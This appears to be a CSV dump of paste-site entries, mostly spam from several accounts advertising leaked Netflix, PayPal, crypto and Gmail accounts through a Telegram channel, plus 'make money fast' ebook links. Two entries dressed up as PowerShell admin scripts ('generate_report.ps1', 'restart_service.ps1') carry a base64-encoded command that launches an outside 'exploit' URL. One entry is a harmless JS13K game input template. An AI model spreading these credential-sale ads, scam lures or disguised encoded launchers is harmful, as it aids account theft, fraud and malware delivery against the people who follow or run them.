id,title,username,language,date,content
kwy77h6E,Netflix Premium UHD Hits,Nisar1783,JavaScript,Tuesday 17th of June 2025 06:58:54 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 63862"
9AfT4i5e,✅ Crypto Accounts,Nisar1783,JavaScript,Tuesday 17th of June 2025 06:58:28 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 47446"
B5EK83nQ,✅ PayPal Hits,Nisar1783,JavaScript,Tuesday 17th of June 2025 06:58:16 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 20048"
MSDf2Heh,GMAIL Logs (2FA disabled),Nisar1783,JavaScript,Tuesday 17th of June 2025 06:58:04 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 49309"
43BzWT0n,Make $1200 in 15 minutes,AdamTolol88,JavaScript,Tuesday 17th of June 2025 06:56:49 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 66485"
ppk2hZGK,Netflix Premium UHD Hits,AdamTolol88,JavaScript,Tuesday 17th of June 2025 06:56:37 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 79513"
nN85E76G,✅ Crypto Accounts,AdamTolol88,JavaScript,Tuesday 17th of June 2025 06:56:14 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 73672"
tvYhCSjs,✅ PayPal Hits,AdamTolol88,JavaScript,Tuesday 17th of June 2025 06:56:02 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 76187"
Jp4abs92,GMAIL Logs (2FA disabled),AdamTolol88,JavaScript,Tuesday 17th of June 2025 06:55:44 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 64797"
TfMxrsVQ,Make $1200 in 15 minutes,gelidorm,JavaScript,Tuesday 17th of June 2025 06:54:41 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 29205"
tA4yrS5J,Netflix Premium UHD Hits,gelidorm,JavaScript,Tuesday 17th of June 2025 06:54:30 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 26705"
ek5ZQVsT,✅ Crypto Accounts,gelidorm,JavaScript,Tuesday 17th of June 2025 06:53:04 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 86692"
rGcmpdA2,✅ PayPal Hits,gelidorm,JavaScript,Tuesday 17th of June 2025 06:52:52 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 01282"
pHjfgB6v,GMAIL Logs (2FA disabled),gelidorm,JavaScript,Tuesday 17th of June 2025 06:52:40 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 81045"
33DPkc4i,✅ PayPal Hits,Pipogr,JavaScript,Tuesday 17th of June 2025 06:52:05 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 26369"
t8UsCZdt,GMAIL Logs (2FA disabled),Pipogr,JavaScript,Tuesday 17th of June 2025 06:51:54 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 48531"
wL16HmS5,JS13K 2025 - Input v0.1,Alex_ADEdge,JavaScript,Tuesday 17th of June 2025 06:51:28 AM CDT,"<!-- JS13K, 2025, By AlexDeltaDev twitter.com/Alex_ADEdge -->
<!DOCTYPE html>
<html lang=""en"">
    <head>
        <meta charset=""UTF-8"">
        <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
        <title>JS13K-Warmup-Template</title>
        <link rel=""stylesheet"" href=""style.css"">
        <!-- <script src=""https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js""></script> -->
        <!-- <script type=""module"" src=""./src/main.js""></script> -->
        <script>       
            var up = false, right = false, down = false, left = false; // keyboard values
            var c_up = false, c_right = false, c_down = false, c_left = false; // controller values
            // Baseline variables 
            var mobile, app, cvs, cx, w, h, asp, asp2, rect, rng, seed, mouseX, mouseY;
            // Scalings
            var w2 = 960; var h2 = 540;
            // Toggles
            var debug = true;
            var webGL = true;
            //GamePad
            var gp;

            // App Setup
            window.onload = function() 
            {
                initSetup();
            }

            function initSetup() 
            {
                console.log(""Initilizing..."");
                cvs = document.getElementById('cvs');
                cx = cvs.getContext(""2d"");
                w = cvs.clientWidth;
                h = cvs.clientHeight;
                asp = w/h; // Aspect ratio of window
                asp2 = w2/h2; // Aspect ratio of inner cvs
                
                cx.imageSmoothingEnabled = false; // gritty

                setupEventListeners(cvs);

                tick();
            }

            function tick(timestamp) 
            {
                cx.clearRect(0, 0, w, h);
                
                // Update gamepad state every loop
                gp = navigator.getGamepads()[0];
                if (gp) {
                    checkGamePad();
                } else {
                    console.log(""Gamepad not found"");
                }

                // Draw debug outputs to cavans
                cx.font = '16px monospace';
                cx.fillStyle = '#fff';
                if(up || c_up) { cx.fillStyle = '#3f3'; }
                cx.fillText('Up: ' + (up || c_up), 10, 30);

                cx.fillStyle = '#fff';
                if(down || c_down) { cx.fillStyle = '#3f3'; }
                cx.fillText('Down: ' + (down || c_down), 10, 50);

                cx.fillStyle = '#fff';
                if(left || c_left) { cx.fillStyle = '#3f3'; }
                cx.fillText('Left: ' + (left || c_left), 10, 70);

                cx.fillStyle = '#fff';
                if(right || c_right) { cx.fillStyle = '#3f3'; }
                cx.fillText('Right: ' + (right || c_right), 10, 90);

                // Request next frame, ie r loop
                requestAnimationFrame(tick);
            }

            // Keydown listener
            onkeydown = (e) => {
                const k = e.key.toLowerCase();
                // Up (up / W / Z)
                if (k === ""arrowup"" || k === ""w"" || k === ""z"") up = true;
                // Right (right / D)
                if (k === ""arrowright"" || k === ""d"") right = true;
                // Down (down / S)
                if (k === ""arrowdown"" || k === ""s"") down = true;
                // Left (left / A / Q)
                if (k === ""arrowleft"" || k === ""a"" ||k === ""q"") left = true;
                // console.log(""E: "" + e.key);
            }

            // Keyup listener
            onkeyup = (e) => {
                const k = e.key.toLowerCase();
                // Up
                if (k === ""arrowup"" || k === ""w"" || k === ""z"") up = false;
                // Right
                if (k === ""arrowright"" || k === ""d"") right = false;
                // Down
                if (k === ""arrowdown"" || k === ""s"") down = false;
                // Left
                if(k === ""arrowleft"" || k === ""a"" || k === ""q"") left = false;
                // console.log(""UP: "" + up);
            }

            function checkGamePad() {
                const b = gp.buttons;
                //debug all buttons
                // console.log(JSON.stringify(gp.buttons.map(b => b.value), null, 2));
                // b.forEach((btn, index) => {
                //     if (btn.pressed) console.log(""Button pressed:"", index);
                // });

                // D-Pad buttons
                c_up    = b[12]?.pressed;
                c_down  = b[13]?.pressed;
                c_left  = b[14]?.pressed;
                c_right = b[15]?.pressed;
        
                // Left stick test
                const lx = gp.axes[0], ly = gp.axes[1];
                if (lx < -0.5) c_left = true;
                if (lx >  0.5) c_right = true;
                if (ly < -0.5) c_up = true;
                if (ly >  0.5) c_down = true;
            }

            function setupEventListeners(c) {
                // Keyboard (WASD/ZQSD/Arrows) Events
                c.addEventListener('keydown', onkeydown);
                c.addEventListener('keyup', onkeyup);

                // Gamepad/Controller Events
                c.addEventListener(""gamepadconnected"", (e) => {
                    // console.log(""Gamepad connected:"", e.gamepad);
                    console.log(
                        ""Gamepad connected at index %d: %s. %d buttons, %d axes."",
                        e.gamepad.index,
                        e.gamepad.id,
                        e.gamepad.buttons.length,
                        e.gamepad.axes.length,
                    );
                    gp = navigator.getGamepads()[0];
                });
                c.addEventListener(""gamepaddisconnected"", e => {
                    console.log(""Gamepad disconnected:"", e.gamepad.id);
                });

                // Mouse/Touch Events
                c.addEventListener('pointermove', (e) => {
                    // console.log(""pointermove"");
                });
                c.addEventListener('pointerdown', (e) => {
                    // console.log(""pointerdown"");
                });
                c.addEventListener('pointerup', (e) => {
                    // console.log(""pointerup"");
                });
                c.addEventListener('pointercancel', (e) => {
                    // The same as pointer up, but for mobile specific cases
                    // console.log(""pointercancel"");
                });
            }
        </script>
    </head>
    <body>
        <h3 id=""title"">JS13K 2025 (Warmup/Template)</h3>
        <p id=""title2"">v.0.0-</p>
        <canvas id=""cvs"" width=""960"" height=""540""></canvas>
    </body>
</html>"
yfe9WLag,generate_report.ps1,parasguglani,Batch,Tuesday 17th of June 2025 06:50:33 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AOQBiADAANAA5ADkAMAA0AA==

eHFF54"
rdU7XR85,????Make $3500 INSTANTLY [Works Worldwide]???? HL,nusax,Java,Tuesday 17th of June 2025 06:50:05 AM CDT," 
>EBOOK<
LATEST(TESTED TODAY)>https://www.dropbox.com/scl/fi/qulaxq261ytn9nv3c2v92/25.pdf?rlkey=3c55euf9y4xgau0cmm0jgarr3&e=1&st=w14aigmk&dl=0

wiQQCj"
Fxi5i9gs,restart_service.ps1,ishunku39,Batch,Tuesday 17th of June 2025 06:49:34 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0ANwA1ADcAYwAyADgAMABkAA==

NXDTvS"
HAQXJPBU,?Make 1500$ in 1 day [Method]? AZ,Harsh850,Java,Tuesday 17th of June 2025 06:49:03 AM CDT," 
>EBOOK<
LATEST(TESTED TODAY)>https://www.dropbox.com/scl/fi/0diu5qpna89bwhnhlowx1/updated.pdf?rlkey=sqpmxd0e3k9c9blkymmta9dnp&e=1&st=q8hj7c9a&dl=0

Wr12fI"
dDFfQZwP,Make $1200 in 15 minutes,skyshopv2,JavaScript,Tuesday 17th of June 2025 06:49:02 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 99652"
46mNLaqF,Netflix Premium UHD Hits,skyshopv2,JavaScript,Tuesday 17th of June 2025 06:48:49 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 40725"
2k8YWD2h,✅ Crypto Accounts,skyshopv2,JavaScript,Tuesday 17th of June 2025 06:48:25 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 73406"
1AUMgb5m,✅ PayPal Hits,skyshopv2,JavaScript,Tuesday 17th of June 2025 06:48:13 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 23978"
k2BdwSVx,GMAIL Logs (2FA disabled),skyshopv2,JavaScript,Tuesday 17th of June 2025 06:48:01 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 87636"
qfsgF8ii,✅ PayPal Hits,L_01,JavaScript,Tuesday 17th of June 2025 06:47:36 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 08132"
AK3mNhAC,GMAIL Logs (2FA disabled),L_01,JavaScript,Tuesday 17th of June 2025 06:47:23 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 87784"
Zq3c0jx4,Make $1200 in 15 minutes,ilovetoligmalOL,JavaScript,Tuesday 17th of June 2025 06:45:06 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 98610"
8nmLCa8u,Netflix Premium UHD Hits,ilovetoligmalOL,JavaScript,Tuesday 17th of June 2025 06:44:54 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 63907"
A2AmmGgm,✅ Crypto Accounts,ilovetoligmalOL,JavaScript,Tuesday 17th of June 2025 06:43:53 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 76095"
tTnbLuRq,✅ PayPal Hits,ilovetoligmalOL,JavaScript,Tuesday 17th of June 2025 06:43:41 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 08836"
KPnaMcNT,GMAIL Logs (2FA disabled),ilovetoligmalOL,JavaScript,Tuesday 17th of June 2025 06:43:30 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 13807"
d67XmSb8,Make $1200 in 15 minutes,Pipogr,JavaScript,Tuesday 17th of June 2025 06:43:16 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/leakedbylucas

Accounts: 31109"
